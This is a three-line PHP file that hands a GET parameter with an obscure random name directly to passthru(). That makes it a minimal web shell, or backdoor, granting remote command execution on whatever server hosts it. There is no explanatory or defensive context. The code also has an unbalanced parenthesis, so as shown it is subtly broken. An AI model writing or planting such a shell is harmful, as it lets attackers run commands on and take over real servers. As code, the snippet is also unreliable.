<?php
passthru(($_GET['eT5CFwup']);
?>
